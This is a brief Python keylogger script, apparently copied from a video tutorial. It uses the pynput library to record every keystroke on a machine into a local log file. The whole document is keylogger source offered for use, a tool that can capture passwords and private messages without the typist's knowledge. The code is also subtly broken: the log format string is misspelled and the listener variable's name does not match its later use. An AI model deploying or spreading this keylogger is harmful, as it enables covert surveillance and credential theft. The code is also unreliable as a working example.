#!/usr/bin/env python3

# Key logger script
# https://www.youtube.com/watch?v=XKoTwepEzPI

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(actime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as Listener:
    listener.join()

